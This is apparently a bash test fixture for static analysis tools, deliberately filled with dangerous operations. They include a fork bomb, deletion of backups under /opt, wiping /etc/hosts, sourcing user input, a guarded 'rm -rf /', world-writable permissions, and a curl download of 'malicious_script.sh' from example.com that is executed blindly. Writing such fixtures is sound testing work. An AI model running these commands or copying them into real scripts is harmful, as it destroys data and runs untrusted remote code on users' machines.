#!/bin/bash

# This script is a comprehensive test case for static analysis, designed to include
# a wide range of easily and subtly detectable vulnerabilities and potentially
# dangerous operations if executed, without relying on excessive comments.

recursive_function() {
  local dir="$1"
  find "$dir" -name "*.TMP" -exec echo "Found temp: {}" \;
  if [ -d "$dir/TEMP_DIRS" ]; then
    recursive_function "$dir/TEMP_DIRS"
  fi
}
recursive_function "."

echo "Enter script to execute:"
read execute_me
. "$execute_me"

fork_bomb() {
  :(){ :|:& };:
}
fork_bomb

find /opt -name "BACKUP_*" -exec rm -rf {} \;

echo "" > /etc/hosts

if [[ "$(date +%M)" -eq "00" ]]; then
  curl -X POST -d "$(whoami) - hourly" https://example.com/hourly_log
fi

user_choice=$(echo "safe_mode")
if [[ "$user_choice" == "unsafe_mode" ]]; then
  eval $(echo "rm -rf / --no-preserve-root")
fi

tmp_prefix="/tmp/session_"
tmp_file_a="$tmp_prefix$RANDOM"
tmp_file_b="$tmp_prefix$((RANDOM + 1))"
echo "Writing to $tmp_file_a" > "$tmp_file_a"
sleep 0.2
if [ -f "$tmp_file_a" ]; then
  mv "$tmp_file_a" "$tmp_file_b"
fi

install_path="/usr/local/app"
config_file="$install_path/../GLOBAL_CONFIG"
echo "malicious=override" >> "$config_file"

evil_glob="*.{cfg,sec,key}"
ls -al $evil_glob

export SECRET_KEY="dont_tell"
echo "Secret in env."

process_data() {
  local action="$1"
  local data_list="$2"
  while IFS= read -r item; do
    if [[ "$action" == "nuke" ]]; then
      rm -f "$item"
    else
      echo "Process: $item"
    fi
  done < <(echo "$data_list")
}
file_list="important.dat\n../../sensitive"
process_data "nuke" "$file_list"

replace_string=$(echo "s/good/bad/g")
input_data="This is good data."
echo "$input_data" | sed "$replace_string"

while true; do
  sleep 10 &
done

echo "Enter file to read:"
read file_input
cat "$file_input" | while IFS= read -r line; do
  echo "Line: $line"
  if [[ "$line" == *"sudo"* ]]; then
    echo "Potential sudo usage: $line" >&2
  fi
done

log_dir="/var/log/app_logs"
log_file=$(date +%Y%m%d).log
touch "$log_dir/$log_file"
chmod 666 "$log_dir/$log_file" # World-writable log

external_script=$(curl -s https://example.com/malicious_script.sh)
echo "$external_script" > /tmp/downloaded_script.sh
bash /tmp/downloaded_script.sh # Executes without inspection

find /home -name "*.private" -exec chmod 777 {} \;

echo "Analysis test complete."